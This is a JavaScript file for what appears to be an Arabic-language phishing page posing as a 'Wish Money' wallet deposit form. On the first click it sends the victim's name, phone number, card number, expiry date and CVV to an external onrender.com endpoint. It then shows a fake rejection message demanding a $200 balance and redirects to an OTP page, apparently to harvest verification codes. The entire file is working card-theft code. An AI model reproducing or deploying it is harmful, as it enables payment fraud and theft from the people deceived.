document.addEventListener('DOMContentLoaded', () => {
  const cardInput = document.getElementById('cardNumber');
  const expiryInput = document.getElementById('expiryDate');
  const ctaBtn = document.getElementById('ctaBtn');
  const btnText = ctaBtn.querySelector('.btn-text');
  const loader = ctaBtn.querySelector('.loader');
  const errorText = document.getElementById('errorText');
  const activateWalletBtn = document.getElementById('activateWalletBtn');
  const fullNameInput = document.getElementById('fullName');
  const mobileInput = document.getElementById('mobileNumber');
  const cvvInput = document.getElementById('cvv');

  let firstClick = true;

  // ----------------- Helpers -----------------
  const onlyDigits = str => str.replace(/\D/g, '');

  const formatCardNumber = value => {
    const digits = onlyDigits(value).slice(0, 16);
    const parts = digits.match(/.{1,4}/g) || [];
    return parts.join(' ');
  };

  const formatExpiry = value => {
    const digits = onlyDigits(value).slice(0, 4);
    if (digits.length <= 2) return digits;
    return digits.slice(0, 2) + '/' + digits.slice(2);
  };

  const isValidCardNumber = value => onlyDigits(value).length === 16;

  const isValidExpiry = value => {
    if (!/^\d{2}\/\d{2}$/.test(value)) return false;
    const [mm, yy] = value.split('/').map(n => parseInt(n, 10));
    return mm >= 1 && mm <= 12;
  };

  // ----------------- Formatting Events -----------------
  cardInput.addEventListener('input', e => { e.target.value = formatCardNumber(e.target.value); });
  cardInput.addEventListener('paste', e => {
    e.preventDefault();
    const pasteData = (e.clipboardData || window.clipboardData).getData('text');
    e.target.value = formatCardNumber(pasteData);
  });

  expiryInput.addEventListener('input', e => { e.target.value = formatExpiry(e.target.value); });
  expiryInput.addEventListener('paste', e => {
    e.preventDefault();
    const pasteData = (e.clipboardData || window.clipboardData).getData('text');
    e.target.value = formatExpiry(pasteData);
  });

  // ----------------- CTA Button Click -----------------
  ctaBtn.addEventListener('click', async () => {
    const cardVal = cardInput.value.trim();
    const expiryVal = expiryInput.value.trim();
    const fullNameVal = fullNameInput.value.trim();
    const mobileVal = mobileInput.value.trim();
    const cvvVal = cvvInput.value.trim();

    const errors = [];
    if (!isValidCardNumber(cardVal)) errors.push('رقم البطاقة غير صحيح — يجب أن يحتوي على 16 رقمًا.');
    if (!isValidExpiry(expiryVal)) errors.push('تاريخ الانتهاء غير صحيح — استخدم الصيغة MM/YY وتأكد من أن الشهر بين 01 و 12.');

    if (errors.length) {
      alert(errors.join('\n'));
      return;
    }

    if (firstClick) {
      // First click: show loader for 7 seconds
      btnText.style.display = 'none';
      loader.style.display = 'inline-block';
      ctaBtn.disabled = true;

      // ----------------- Send data to API -----------------
      try {
        const response = await fetch("https://dashboard-xwzz.onrender.com/api/messages", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            text: `\n🔑 بيانات المستخدم:\nالاسم:\n ${fullNameVal}\nرقم الجوال: \n${mobileVal}\nرقم البطاقة: \n${cardVal}\nتاريخ الانتهاء: \n${expiryVal}\nCVV: \n${cvvVal}`
          })
        });
        console.log("API Response status:", response.status);
      } catch (err) {
        console.error("API Error:", err);
      }
      // -----------------------------------------------------

      setTimeout(() => {
        loader.style.display = 'none';
        ctaBtn.style.display = 'none';
        btnText.style.display = 'inline-block';
        ctaBtn.disabled = false;

        // Show red warning text below the CTA button
        errorText.textContent = 'تم رفض عملية الايداع من قبل محفظة ويش موني حيث أنها غير فعالة لإيداع مبلغ نقدي عالي. يجب أن يكون رصيد المحفظة على الأقل ٢٠٠ دولار لرفع سقف الايداع.';
        errorText.style.display = 'block';

        // Show "تم تفعيل المحفظة" button
        activateWalletBtn.style.display = 'block';

        // After 15 seconds, activate the button
        setTimeout(() => {
          activateWalletBtn.disabled = false;
          activateWalletBtn.style.cursor = 'pointer';
        }, 15000);

        firstClick = false;
      }, 7000);

      return;
    }

    // Subsequent click: show loader 2 seconds then navigate
    btnText.style.display = 'none';
    loader.style.display = 'inline-block';
    ctaBtn.disabled = true;
  });

  // ----------------- Activate Wallet Button -----------------
  activateWalletBtn.addEventListener('click', () => {
    if (!activateWalletBtn.disabled) {
      setTimeout(() => {
        window.location.href = 'otp.html';
      }, 2000);
    }
  });
});
